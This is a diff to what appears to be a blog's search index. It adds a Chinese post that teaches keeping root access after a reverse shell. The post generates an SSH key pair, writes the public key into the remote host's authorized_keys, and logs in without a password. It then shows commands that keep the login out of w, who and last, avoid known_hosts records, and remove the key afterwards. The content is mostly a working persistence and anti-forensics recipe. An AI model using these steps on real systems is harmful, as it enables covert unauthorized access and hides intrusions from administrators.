@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>无密码SSH登录</title>
+      <link href="2021/04/19/%E6%97%A0%E5%AF%86%E7%A0%81SSH%E7%99%BB%E5%BD%95/"/>
+      <url>2021/04/19/%E6%97%A0%E5%AF%86%E7%A0%81SSH%E7%99%BB%E5%BD%95/</url>
+      
+        <content type="html"><![CDATA[<h1 id="无密码SSH登录"><a href="#无密码SSH登录" class="headerlink" title="无密码SSH登录"></a>无密码SSH登录</h1><p>用于反弹shell之后权限维持</p><p>##导出自己的ssh公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f zoukba</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> zoukba.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> zoukba.pub.</span><br></pre></td></tr></table></figure><p>会在当前路径下生成你的公钥</p><h2 id="读取密钥"><a href="#读取密钥" class="headerlink" title="读取密钥"></a>读取密钥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat zoukba.pub</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDN+cbSlui73UfXhg/5UI9Bwi4x+Eqy94GW5h9G7kQBqtPOYSyMk9Y6QRbF/XYMEuNVr92Q2PY8dttIF...[skip]...</span><br><span class="line">zuy5V6Ljp1u2hIO2vJTtAwWxdBa+HUZ0bwhK8EKRkYts7yPc7SZTHenDqx6pkA+7/fzSArHss5VvUjkSQtlJkKipziZLUPpQLngmUUCKDxCowmo/R3w/0Fq51SuCYgmn0Pd8l5Z5eAS7h1//crDX7EdBbkak/bwZvMpL6AhZNlVXqqhJDnThv9sjFcd8mcJs+Hdc7HHMZdmbgAI9qNa8nNhU= a0@Zoooooo.local</span><br></pre></td></tr></table></figure><h2 id="在远程主机的-ssh-目录写入authorized-keys"><a href="#在远程主机的-ssh-目录写入authorized-keys" class="headerlink" title="在远程主机的.ssh/ 目录写入authorized_keys"></a>在远程主机的<code>.ssh/</code> 目录写入<code>authorized_keys</code></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDN+cbSlui73UfXhg/5UI9Bwi4x+Eqy94GW5h9G7kQBqtPOYSyMk9Y6QRbF/XYMEuNVr92Q2PY8dttIF...[skip]...</span><br><span class="line">zuy5V6Ljp1u2hIO2vJTtAwWxdBa+HUZ0bwhK8EKRkYts7yPc7SZTHenDqx6pkA+7/fzSArHss5VvUjkSQtlJkKipziZLUPpQLngmUUCKDxCowmo/R3w/0Fq51SuCYgmn0Pd8l5Z5eAS7h1//crDX7EdBbkak/bwZvMpL6AhZNlVXqqhJDnThv9sjFcd8mcJs+Hdc7HHMZdmbgAI9qNa8nNhU= a0@Zoooooo.local &gt; authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="给予相应的权限"><a href="#给予相应的权限" class="headerlink" title="给予相应的权限"></a>给予相应的权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 auth*</span><br></pre></td></tr></table></figure><h2 id="实现无密码登录，权限维持"><a href="#实现无密码登录，权限维持" class="headerlink" title="实现无密码登录，权限维持"></a>实现无密码登录，权限维持</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -i zoukba root@172.20.10.7<span class="comment">#-i 跟着你的密钥文件名</span></span><br><span class="line">Last failed login: Mon Apr 19 21:25:24 CST 2021 on pts/0</span><br><span class="line">There was 1 failed login attempt since the last successful login.</span><br><span class="line">Last login: Mon Apr 19 21:25:00 2021</span><br><span class="line">[root@localhost ~]<span class="comment"># ls</span></span><br></pre></td></tr></table></figure><h2 id="登录痕迹"><a href="#登录痕迹" class="headerlink" title="登录痕迹"></a>登录痕迹</h2><h3 id="隐身登录系统，不会被w、who、last等指令检测到"><a href="#隐身登录系统，不会被w、who、last等指令检测到" class="headerlink" title="隐身登录系统，不会被w、who、last等指令检测到"></a>隐身登录系统，不会被w、who、last等指令检测到</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@192.168.0.1 /bin/bash -i zoukba</span><br></pre></td></tr></table></figure><h3 id="不记录ssh公钥在本地-ssh目录中"><a href="#不记录ssh公钥在本地-ssh目录中" class="headerlink" title="不记录ssh公钥在本地.ssh目录中"></a>不记录ssh公钥在本地.ssh目录中</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</span><br></pre></td></tr></table></figure><h3 id="在远程主机上记得删除自己的密钥文件"><a href="#在远程主机上记得删除自己的密钥文件" class="headerlink" title="在远程主机上记得删除自己的密钥文件"></a>在远程主机上记得删除自己的密钥文件</h3>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网杂七杂八 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Linux内网权限维持 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>BullDog-writeup</title>
       <link href="2021/04/18/BullDog/"/>
       <url>2021/04/18/BullDog/</url>
